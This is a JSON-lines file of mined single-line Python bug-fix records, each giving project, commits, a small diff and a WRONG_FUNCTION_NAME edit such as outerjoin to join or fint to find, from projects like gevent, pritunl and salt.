{"project": "django-jinja", "commit_sha": "2e28d754963892910566fd0eb268694e6b23eede", "parent_sha": "4a25adf971af01a7f7b24d938d69614f86fcff02", "file_path": "testing/testapp/tests.py", "project_url": "https://github.com/alanjds/django-jinja", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -377,7 +377,7 @@ class TemplateDebugSignalsTest(TestCase):\n \n class BaseTests(TestCase):\n     def test_match_template(self):\n-        self.assertFalse(\n+        self.assertTrue(\n             match_template('admin/foo.html', regex=None, extension=None))\n         self.assertFalse(\n             match_template('admin/foo.html', regex=None, extension='.jinja'))\n", "before": "self . assertFalse ( match_template ( 'admin/foo.html' , regex = None , extension = None ) )", "after": "self . assertTrue ( match_template ( 'admin/foo.html' , regex = None , extension = None ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:assertFalse\", 3, 14, 3, 25], \"assertTrue\"]]"}
{"project": "security_monkey", "commit_sha": "bccaed13da867b1212870644ec9a12749cdb4158", "parent_sha": "f56023a733e4dfc0f8590812e4502fe75ee23550", "file_path": "security_monkey/views/auditor_settings.py", "project_url": "https://github.com/Gnostech/security_monkey", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -126,7 +126,7 @@ class AuditorSettingsGet(AuthenticatedService):\n                     ItemAudit.auditor_setting_id\n                 ).subquery()\n \n-                query = query.outerjoin(\n+                query = query.join(\n                     (stmt, AuditorSettings.id == stmt.c.auditor_setting_id)\n                 )\n \n", "before": "query = query . outerjoin ( ( stmt , AuditorSettings . id == stmt . c . auditor_setting_id ) )", "after": "query = query . join ( ( stmt , AuditorSettings . id == stmt . c . auditor_setting_id ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:outerjoin\", 3, 31, 3, 40], \"join\"]]"}
{"project": "salt", "commit_sha": "6b37c93f85aa76e0b9ee55a6b00a2a98a31d654c", "parent_sha": "8c80b82c9f7285d3de1bf97acbbc5c40d1da7a3e", "file_path": "salt/modules/dockerio.py", "project_url": "https://github.com/kraney/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1705,7 +1705,7 @@ def push(repo, tag=None, quiet=False, insecure_registry=False):\n                                        oper='>=',\n                                        ver2='0.5.0'):\n             kwargs['insecure_registry'] = insecure_registry\n-        ret = client.pull(repo, **kwargs)\n+        ret = client.push(repo, **kwargs)\n         if ret:\n             image_logs, infos = _parse_image_multilogs_string(ret)\n             if image_logs:\n", "before": "ret = client . pull ( repo , ** kwargs )", "after": "ret = client . push ( repo , ** kwargs )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:pull\", 3, 22, 3, 26], \"push\"]]"}
{"project": "tkobr-addons", "commit_sha": "151e657b328b136a83a631a3564bd1fa970088ee", "parent_sha": "7115e04f3fbb4c1f04f82c520fee89ca41b454fe", "file_path": "tko_web_sessions_management/main.py", "project_url": "https://github.com/OdooBulgaria/tkobr-addons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -148,7 +148,7 @@ class Home_tkobr(openerp.addons.web.controllers.main.Home):\n                 SUPERUSER_ID, SUPERUSER_ID, request.context)\n             self.save_session(request.cr, uid, user.tz,\n                 request.httprequest.session.sid, unsuccessful_message, request.context)\n-            _logger.warning(unsuccessful_message)\n+            _logger.error(unsuccessful_message)\n             request.uid = old_uid\n             values['error'] = 'Login failed due to one of the following reasons:'\n             values['reason1'] = '- Wrong login/password'\n", "before": "_logger . warning ( unsuccessful_message )", "after": "_logger . error ( unsuccessful_message )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:warning\", 3, 21, 3, 28], \"error\"]]"}
{"project": "irc-transport", "commit_sha": "b3a6c9f404e077fed94373613b453b74a13dcb36", "parent_sha": "30c2792f933d6f6539f74c7260a1514c242350a1", "file_path": "irc.py", "project_url": "https://github.com/normanr/irc-transport", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -643,7 +643,7 @@ class Transport:\n         if event.getQueryPayload().getTag('remove'):\n         \tremove = True\n         elif event.getQueryPayload().getTag('charset'):\n-        \tucharset = event.getQueryPayload().getTag('charset')\n+        \tucharset = event.getQueryPayload().getTagData('charset')\n         else:\n         \tself.jabber.send(Error(event,ERR_NOT_ACCEPTABLE))\n         if not remove:\n", "before": "ucharset = event . getQueryPayload ( ) . getTag ( 'charset' )", "after": "ucharset = event . getQueryPayload ( ) . getTagData ( 'charset' )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:getTag\", 3, 45, 3, 51], \"getTagData\"]]"}
{"project": "BiblioPixel2", "commit_sha": "c3a51ff8ebdf621b33ed838ff31a4c1ee554c318", "parent_sha": "fd143b4eb5c25acef6e9517afdc04470e5aa4116", "file_path": "bibliopixel/led.py", "project_url": "https://github.com/ManiacalLabs/BiblioPixel2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -230,7 +230,7 @@ class LEDMatrix(LEDBase):\n             return #just throw out anything out of bounds\n \n         pixel = self.matrix_map[y][x]\n-        self.set(pixel, (r, g, b))\n+        self.setRGB(pixel, (r, g, b))\n \n     ###############################################################################\n     # Drawing Functions\n", "before": "self . set ( pixel , ( r , g , b ) )", "after": "self . setRGB ( pixel , ( r , g , b ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:set\", 3, 14, 3, 17], \"setRGB\"]]"}
{"project": "adba", "commit_sha": "426d1c65b842343c1b432d7071c6ec03e3941291", "parent_sha": "77b4516747163bb5bdf7809e3f55dcbec121eac8", "file_path": "adba/aniDBAbstracter.py", "project_url": "https://github.com/pymedusa/adba", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -148,7 +148,7 @@ class Anime(aniDBabstractObject):\n         regex = re.compile('[%s]' % re.escape(string.punctuation))\n         name = regex.sub('', name.lower())\n         lastAid = 0\n-        for element in self.allAnimeXML.iter():\n+        for element in self.allAnimeXML.getiterator():\n             if element.get(\"aid\",False):\n                 lastAid = int(element.get(\"aid\"))\n             if element.text:\n", "before": "for element in self . allAnimeXML . iter ( ) : if element . get ( \"aid\" , False ) : lastAid = int ( element . get ( \"aid\" ) ) if element . text : ", "after": "for element in self . allAnimeXML . getiterator ( ) : if element . get ( \"aid\" , False ) : lastAid = int ( element . get ( \"aid\" ) ) if element . text : ", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:iter\", 3, 41, 3, 45], \"getiterator\"]]"}
{"project": "adba", "commit_sha": "2b70dffa3296914ade281df1a644a19af6b12e3f", "parent_sha": "df9263f8b9969a20c25fdb2f99ff7ac14b9f37e5", "file_path": "adba/aniDBcommands.py", "project_url": "https://github.com/pymedusa/adba", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -285,7 +285,7 @@ class MyListCommand(Command):\n         elif fid or size or ed2k:\n             resp = intr.file(fid=fid, size=size, ed2k=ed2k)\n             if resp.rescode != '220':\n-                resp = NoSuchMylistResponse(self, None, '321', 'NO SUCH ENTRY (FILE NOT FOUND)', [])\n+                resp = NoSuchMylistFileResponse(self, None, '321', 'NO SUCH ENTRY (FILE NOT FOUND)', [])\n                 resp.parse()\n                 return resp\n             fid = resp.datalines[0]['fid']\n", "before": "resp = NoSuchMylistResponse ( self , None , '321' , 'NO SUCH ENTRY (FILE NOT FOUND)' , [ ] )", "after": "resp = NoSuchMylistFileResponse ( self , None , '321' , 'NO SUCH ENTRY (FILE NOT FOUND)' , [ ] )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:NoSuchMylistResponse\", 3, 24, 3, 44], \"NoSuchMylistFileResponse\"]]"}
{"project": "ocrd_anybaseocr", "commit_sha": "71a31df5c0916be422ba7c57fb083190a84b039a", "parent_sha": "ee33f34d95524d1e384747591d03e62415ff76b2", "file_path": "ocrd_anybaseocr/cli/ocrd_anybaseocr_dewarp.py", "project_url": "https://github.com/mjenckel/ocrd_anybaseocr", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -61,7 +61,7 @@ def prepare_options(gpu_id, dataroot, model_path, resize_or_crop, loadSize, fine\n     sys.argv.extend(['--fineSize', str(fineSize)])\n     sys.argv.extend(['--model', 'pix2pixHD'])\n     sys.argv.extend(['--verbose'])\n-    LOG.info(\"Options passed to pix2pixHD: %s\", sys.argv)\n+    LOG.debug(\"Options passed to pix2pixHD: %s\", sys.argv)\n     opt = TestOptions()\n     opt.initialize()\n     opt = opt.parse(save=False)\n", "before": "LOG . info ( \"Options passed to pix2pixHD: %s\" , sys . argv )", "after": "LOG . debug ( \"Options passed to pix2pixHD: %s\" , sys . argv )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:info\", 3, 9, 3, 13], \"debug\"]]"}
{"project": "gevent", "commit_sha": "f238b3240c136e760a93dc82e51ef36212392fc4", "parent_sha": "b82d15ea17b1f06e5e9d29086e50d388f597d9aa", "file_path": "util/make_dist.py", "project_url": "https://github.com/gevent/gevent", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -118,7 +118,7 @@ def _make_dist(version='dev', fast=False, revert=False):\n         copy(dist_path, join(website_dist_dir, dist_filename))\n \n     if not exists(join(basedir, 'dist')):\n-        os.makedir(join(basedir, 'dist'))\n+        os.mkdir(join(basedir, 'dist'))\n \n     copy(dist_path, join(basedir, 'dist', dist_filename))\n     return dist_path\n", "before": "os . makedir ( join ( basedir , 'dist' ) )", "after": "os . mkdir ( join ( basedir , 'dist' ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:makedir\", 3, 12, 3, 19], \"mkdir\"]]"}
{"project": "gevent", "commit_sha": "10de037f45ab22c89fb53c0884536de9fbe6e7ae", "parent_sha": "98873dcd5ef37360680528768e55357aa176b09b", "file_path": "gevent/baseserver.py", "project_url": "https://github.com/gevent/gevent", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -236,7 +236,7 @@ class BaseServer(object):\n         try:\n             self.start_accepting()\n         except:\n-            self.kill()\n+            self.close()\n             raise\n \n     def close(self):\n", "before": "self . kill ( )", "after": "self . close ( )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:kill\", 3, 18, 3, 22], \"close\"]]"}
{"project": "gevent", "commit_sha": "b1baef80b4faa3d235b24f5a879ac1e8d46c8cc4", "parent_sha": "4bdcbd50c39ec7870c878372019930a3d2eff4c4", "file_path": "greentest/test__event.py", "project_url": "https://github.com/gevent/gevent", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -92,7 +92,7 @@ class TestEvent_SetThenClear(greentest.TestCase):\n \n     def test(self):\n         e = Event()\n-        waiters = [gevent.spawn(e.wait) for i in xrange(self.N)]\n+        waiters = [gevent.spawn(e.wait) for i in range(self.N)]\n         gevent.sleep(0.001)\n         e.set()\n         e.clear()\n", "before": "waiters = [ gevent . spawn ( e . wait ) for i in xrange ( self . N ) ]", "after": "waiters = [ gevent . spawn ( e . wait ) for i in range ( self . N ) ]", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:xrange\", 3, 50, 3, 56], \"range\"]]"}
{"project": "gevent", "commit_sha": "833f8d13bc0277a7283362e88acb08922a0fcb7d", "parent_sha": "9c6ba97c297046715cc68c4b72bcd00de057ca0c", "file_path": "doc/mysphinxext.py", "project_url": "https://github.com/gevent/gevent", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -43,7 +43,7 @@ def missing_reference(app, env, node, contnode):\n         print('Looking for %s' % [type, target, modname, classname])\n         print(node)\n \n-    for docname, items in env.indexentries.iteritems():\n+    for docname, items in env.indexentries.items():\n         if noisy >= 2:\n             print(docname)\n         for (i_type, i_string, i_target, i_aliasname) in items:\n", "before": "for docname , items in env . indexentries . iteritems ( ) : if noisy >= 2 : print ( docname ) for ( i_type , i_string , i_target , i_aliasname ) in items : ", "after": "for docname , items in env . indexentries . items ( ) : if noisy >= 2 : print ( docname ) for ( i_type , i_string , i_target , i_aliasname ) in items : ", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:iteritems\", 3, 44, 3, 53], \"items\"]]"}
{"project": "spiderfoot", "commit_sha": "a12e81f90c0bff4c38dfce956e2586b0f40b3962", "parent_sha": "f2c7744b00f558294cf81bdb6e4048b72079b813", "file_path": "modules/sfp_countryname.py", "project_url": "https://github.com/smicallef/spiderfoot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -233,7 +233,7 @@ class sfp_countryname(SpiderFootPlugin):\n                 # Get country name from first index of list\n                 # Extract only the text part of the country code\n                 matchCountry = matchCountries[0].strip(\",\").strip(\"'\").strip(\"\\\"\").strip()\n-                countries.add(matchCountry)\n+                countries.append(matchCountry)\n         \n         # If any countries are found\n         if len(countries) > 0:\n", "before": "countries . add ( matchCountry )", "after": "countries . append ( matchCountry )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:add\", 3, 27, 3, 30], \"append\"]]"}
{"project": "pritunl", "commit_sha": "814c78b6ce9384def9ed044ab49df35349ca332d", "parent_sha": "c7f00decf61515b57ecc188197c671c111fa44a1", "file_path": "pritunl/server/instance.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -359,7 +359,7 @@ class ServerInstance(object):\n \n     def update_clients_bandwidth(self, clients):\n         # Remove client no longer connected\n-        for client_id in self.clients.iterkeys():\n+        for client_id in self.clients.keys():\n             if client_id not in clients:\n                 del self.clients[client_id]\n \n", "before": "for client_id in self . clients . iterkeys ( ) : if client_id not in clients : del self . clients [ client_id ]", "after": "for client_id in self . clients . keys ( ) : if client_id not in clients : del self . clients [ client_id ]", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:iterkeys\", 3, 39, 3, 47], \"keys\"]]"}
{"project": "pritunl", "commit_sha": "8fb9048ceb02c5d58d51a4d1b5935e784a5645a8", "parent_sha": "3a3cd6f2febbfb468cffd581e6c8b739f5c41d45", "file_path": "pritunl/__main__.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -68,7 +68,7 @@ def main(default_conf=None):\n     elif cmd == 'reconfigure':\n         from pritunl import setup\n         from pritunl import settings\n-        setup.setup_db()\n+        setup.setup_loc()\n \n         settings.conf.mongodb_uri = None\n         settings.conf.commit()\n", "before": "setup . setup_db ( )", "after": "setup . setup_loc ( )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:setup_db\", 3, 15, 3, 23], \"setup_loc\"]]"}
{"project": "pritunl", "commit_sha": "c0300acc3d8f09d542fb7326ae06917206f8d8f6", "parent_sha": "b8ba66874b8d644a1fc6977e7c3b0243e7aeda71", "file_path": "pritunl/subscription.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -39,7 +39,7 @@ def update():\n                     logger.warning('License key is invalid', 'subscription')\n                     settings.app.license = None\n                     settings.commit()\n-                    subscription_update()\n+                    update()\n                     return\n \n                 if response.status_code == 473:\n", "before": "subscription_update ( )", "after": "update ( )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:subscription_update\", 3, 21, 3, 40], \"update\"]]"}
{"project": "pritunl", "commit_sha": "eb4ecf1f372f8022ae278ec01b924559f8d9b4f5", "parent_sha": "1513184d12d9e08aa612ac04594e83592e136e9f", "file_path": "pritunl/user.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -65,7 +65,7 @@ class User(Config):\n \n     def _upgrade_0_10_4(self):\n         if not self.type:\n-            logger.info('Upgrading user to v0.10.4... %r' % {\n+            logger.debug('Upgrading user to v0.10.4... %r' % {\n                 'org_id': self.org.id,\n                 'user_id': self.id,\n             })\n", "before": "logger . info ( 'Upgrading user to v0.10.4... %r' % { 'org_id' : self . org . id , 'user_id' : self . id , } )", "after": "logger . debug ( 'Upgrading user to v0.10.4... %r' % { 'org_id' : self . org . id , 'user_id' : self . id , } )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:info\", 3, 20, 3, 24], \"debug\"]]"}
{"project": "pritunl", "commit_sha": "591451bf4a85244e5ed7087feb8431e991cc2028", "parent_sha": "4213703481c504e312aab0949c70663c8950be2c", "file_path": "pritunl/server.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -138,7 +138,7 @@ class Server(Config):\n         name = self.name\n \n         if self.status:\n-            self.force_stop()\n+            self.stop()\n             for i in xrange(20):\n                 if not self.status:\n                     break\n", "before": "self . force_stop ( )", "after": "self . stop ( )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:force_stop\", 3, 18, 3, 28], \"stop\"]]"}
{"project": "pritunl", "commit_sha": "ef0466410f1164012b4e7f14e79413a6b5fae3ed", "parent_sha": "92caf11890b62c6707dac3fefb4b47a75d2efeef", "file_path": "pritunl/user.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -177,7 +177,7 @@ class User(Config):\n     def load(self, *args, **kwargs):\n         Config.load(self, *args, **kwargs)\n         if not self.otp_secret:\n-            logger.info('User otp secret missing generating new one. %r' % {\n+            logger.debug('User otp secret missing generating new one. %r' % {\n                 self._generate_otp_secret()\n             })\n \n", "before": "logger . info ( 'User otp secret missing generating new one. %r' % { self . _generate_otp_secret ( ) } )", "after": "logger . debug ( 'User otp secret missing generating new one. %r' % { self . _generate_otp_secret ( ) } )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:info\", 3, 20, 3, 24], \"debug\"]]"}
{"project": "pritunl", "commit_sha": "3b5b428c291bef9683e997678c2be854c073477f", "parent_sha": "bd6220709fee5bcbe945301aad1af61d4a1d26b8", "file_path": "pritunl/server/instance.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -273,7 +273,7 @@ class ServerInstance(object):\n             network = utils.parse_network(network_address)[0]\n \n             if network not in routes:\n-                logger.warning('Failed to find interface for local ' + \\\n+                logger.info('Failed to find interface for local ' + \\\n                     'network route, using default route', 'server',\n                     server_id=self.server.id,\n                 )\n", "before": "logger . warning ( 'Failed to find interface for local ' + 'network route, using default route' , 'server' , server_id = self . server . id , )", "after": "logger . info ( 'Failed to find interface for local ' + 'network route, using default route' , 'server' , server_id = self . server . id , )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:warning\", 3, 24, 3, 31], \"info\"]]"}
{"project": "pritunl", "commit_sha": "7a5f4883cc3d77b3896507d66ce30989b6cdd9ee", "parent_sha": "b38ac4d30e00634e424670a2ddbaebb06178f947", "file_path": "pritunl/server/output.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -71,7 +71,7 @@ class ServerOutput(object):\n         self.send_event()\n \n     def push_message(self, message, *args, **kwargs):\n-        timestamp = datetime.datetime.utcnow().strftime(\n+        timestamp = datetime.datetime.now().strftime(\n             '%a %b  %d %H:%M:%S %Y').replace('  0', '   ', 1).replace(\n             '  ', ' ', 1)\n         self.push_output('%s %s' % (timestamp, message), *args, **kwargs)\n", "before": "timestamp = datetime . datetime . utcnow ( ) . strftime ( '%a %b  %d %H:%M:%S %Y' ) . replace ( '  0' , '   ' , 1 ) . replace ( '  ' , ' ' , 1 )", "after": "timestamp = datetime . datetime . now ( ) . strftime ( '%a %b  %d %H:%M:%S %Y' ) . replace ( '  0' , '   ' , 1 ) . replace ( '  ' , ' ' , 1 )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:utcnow\", 3, 39, 3, 45], \"now\"]]"}
{"project": "pritunl", "commit_sha": "f1a6dada6d5aaaffc48829a1c976dae22bd991a1", "parent_sha": "af58b2f9ca0b017b4949e6a17565a5e0fb6376f1", "file_path": "pritunl/queue_runner.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -68,7 +68,7 @@ class QueueRunner(object):\n         }\n \n         for queue_item in Queue.iter_queues(spec):\n-            self.run_queue_item(queue_item)\n+            self.add_queue_item(queue_item)\n \n     def on_queue_msg(self, msg):\n         try:\n", "before": "self . run_queue_item ( queue_item )", "after": "self . add_queue_item ( queue_item )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:run_queue_item\", 3, 18, 3, 32], \"add_queue_item\"]]"}
{"project": "pritunl", "commit_sha": "53a78603df1e21825549f82454bea4add0d697bc", "parent_sha": "95090429af5523a620b745737942b319fa41f75a", "file_path": "pritunl/mongo.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -40,7 +40,7 @@ def setup_mongo():\n     for collection_name, collection in collections.items():\n         collection.name_str = collection_name\n \n-    settings.load()\n+    settings.start()\n     settings.commit(True)\n \n     if prefix + 'log_entries' not in cur_collections:\n", "before": "settings . load ( )", "after": "settings . start ( )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:load\", 3, 14, 3, 18], \"start\"]]"}
{"project": "pritunl", "commit_sha": "e3c0350404f2fba6c161b5cdf518944dd8622c0a", "parent_sha": "4fdc46f932f431613bc693badad3e1d49f53b46a", "file_path": "pritunl/user.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -144,7 +144,7 @@ class User(Config):\n \n     def _remove_cache_trie_key(self):\n         users_trie = CacheTrie(self.org.get_cache_key('users_trie'))\n-        users_trie.remove_key(self.name, '%s-%s-%s' % (\n+        users_trie.remove_key_terms(self.name, '%s-%s-%s' % (\n             self.id, self.type, self.name))\n \n     def _setup_openssl(self):\n", "before": "users_trie . remove_key ( self . name , '%s-%s-%s' % ( self . id , self . type , self . name ) )", "after": "users_trie . remove_key_terms ( self . name , '%s-%s-%s' % ( self . id , self . type , self . name ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:remove_key\", 3, 20, 3, 30], \"remove_key_terms\"]]"}
{"project": "pritunl", "commit_sha": "1f8b114d0638921ac2bd19a62c0c2aeec7d6108c", "parent_sha": "36ef5438cde31d0ed67eaaa3617869d20b2b528c", "file_path": "pritunl/organization.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -81,7 +81,7 @@ class Organization(MongoObject):\n         return User.get_user(self, id=id)\n \n     def find_user(self, name=None, type=None):\n-        return User.get_user(self, name=name, type=type)\n+        return User.find_user(self, name=name, type=type)\n \n     def _get_otp_auth(self):\n         from server import Server\n", "before": "return User . get_user ( self , name = name , type = type )", "after": "return User . find_user ( self , name = name , type = type )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:get_user\", 3, 21, 3, 29], \"find_user\"]]"}
{"project": "btcrelay", "commit_sha": "e7abb3ffaf12b3e96c048cb22ab0ba3c677e2790", "parent_sha": "fd5219886c08c7c4a94a7aa3a4be44246da04a41", "file_path": "btcrelay.py", "project_url": "https://github.com/Runur/btcrelay", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -209,7 +209,7 @@ def within6Confirms(txBlockHash):\n \n # Bitcoin-way of hashing a block header\n def fastHashBlock(blockHeaderBinary:str):\n-    return(flipBytes(sha256(sha256(blockHeaderBinary:str))))\n+    return(flip32Bytes(sha256(sha256(blockHeaderBinary:str))))\n \n \n # an owner may transfer/change ownership\n", "before": "return ( flipBytes ( sha256 ( sha256 ( blockHeaderBinary : str ) ) ) )", "after": "return ( flip32Bytes ( sha256 ( sha256 ( blockHeaderBinary : str ) ) ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:flipBytes\", 3, 12, 3, 21], \"flip32Bytes\"]]"}
{"project": "dups", "commit_sha": "02f6e78170c217c5df22fcf849bf7c10a60997fc", "parent_sha": "ae875c6a5e028d02ef38b26f057ac4b7aabb2d0e", "file_path": "tests/test_io.py", "project_url": "https://github.com/linuxwhatelse/dups", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -156,7 +156,7 @@ class Test_IO(unittest.TestCase):\n             f.write(msg)\n \n         with open(context.TMP_FILE) as f:\n-            self.assertEquals(msg, f.read())\n+            self.assertEqual(msg, f.read())\n \n \n if __name__ == '__main__':\n", "before": "self . assertEquals ( msg , f . read ( ) )", "after": "self . assertEqual ( msg , f . read ( ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:assertEquals\", 3, 18, 3, 30], \"assertEqual\"]]"}
{"project": "pritunl", "commit_sha": "1f70a2bd6d60a126a524a4cd59fa87d3471dadd2", "parent_sha": "5414852c351a9b63163d1b16fc0c279e486a89b2", "file_path": "pritunl/host/usage.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -86,7 +86,7 @@ class HostUsage(object):\n \n             if bulk:\n                 bulk.find(spec).upsert().update(doc)\n-                bulk.fint(rem_spec).remove()\n+                bulk.find(rem_spec).remove()\n             else:\n                 self.collection.update(spec, doc, upsert=True)\n                 self.collection.remove(rem_spec)\n", "before": "bulk . fint ( rem_spec ) . remove ( )", "after": "bulk . find ( rem_spec ) . remove ( )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:fint\", 3, 22, 3, 26], \"find\"]]"}
{"project": "pritunl", "commit_sha": "79138c666d46fe35a8ce323374f2b27d24b52e31", "parent_sha": "6cd231aed27e167282182e7ab7daa9886659970a", "file_path": "pritunl/server/bandwidth.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -82,7 +82,7 @@ class ServerBandwidth(object):\n \n             if bulk:\n                 bulk.find(spec).upsert().update(doc)\n-                bulk.fint(rem_spec).remove()\n+                bulk.find(rem_spec).remove()\n             else:\n                 self.collection.update(spec, doc, upsert=True)\n                 self.collection.remove(rem_spec)\n", "before": "bulk . fint ( rem_spec ) . remove ( )", "after": "bulk . find ( rem_spec ) . remove ( )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:fint\", 3, 22, 3, 26], \"find\"]]"}
{"project": "openstates", "commit_sha": "69d97b4b43bd10816f7bb822537f146ed2220b2d", "parent_sha": "af52c07c4f10358121ee537aa2a9267e580fa158", "file_path": "billy/site/browse/views.py", "project_url": "https://github.com/opencouncil/openstates", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -24,7 +24,7 @@ def all_states(request):\n         state = {}\n         state['id'] = meta['_id']\n         state['name'] = meta['name']\n-        counts = db.counts.find({'_id': state['id']})\n+        counts = db.counts.find_one({'_id': state['id']})\n         s_spec = {'state': state['id']}\n         state['bills'] = counts['bills']\n         state['legislators'] = db.legislators.find(s_spec).count()\n", "before": "counts = db . counts . find ( { '_id' : state [ 'id' ] } )", "after": "counts = db . counts . find_one ( { '_id' : state [ 'id' ] } )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:find\", 3, 28, 3, 32], \"find_one\"]]"}
{"project": "openstates", "commit_sha": "365144c13a2281c259a778c5c7053f2c7bbd088b", "parent_sha": "021254d896e6ad882ac6e0d834dfbf6d7bafb0e5", "file_path": "fiftystates/scrape/la/bills.py", "project_url": "https://github.com/opencouncil/openstates", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -63,7 +63,7 @@ class LABillScraper(BillScraper):\n \n             if bill_id.startswith('SB') or bill_id.startswith('HB'):\n                 bill_type = ['bill']\n-            elif bill_id.startswtih('SCR') or bill_id.startswith('HCR'):\n+            elif bill_id.startswith('SCR') or bill_id.startswith('HCR'):\n                 bill_type = ['concurrent resolution']\n             else:\n                 raise ScrapeError(\"Invalid bill ID format: %s\" % bill_id)\n", "before": "if bill_id . startswith ( 'SB' ) or bill_id . startswith ( 'HB' ) : bill_type = [ 'bill' ] elif bill_id . startswtih ( 'SCR' ) or bill_id . startswith ( 'HCR' ) : bill_type = [ 'concurrent resolution' ] else : raise ScrapeError ( \"Invalid bill ID format: %s\" % bill_id )", "after": "if bill_id . startswith ( 'SB' ) or bill_id . startswith ( 'HB' ) : bill_type = [ 'bill' ] elif bill_id . startswith ( 'SCR' ) or bill_id . startswith ( 'HCR' ) : bill_type = [ 'concurrent resolution' ] else : raise ScrapeError ( \"Invalid bill ID format: %s\" % bill_id )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:startswtih\", 3, 26, 3, 36], \"startswith\"]]"}
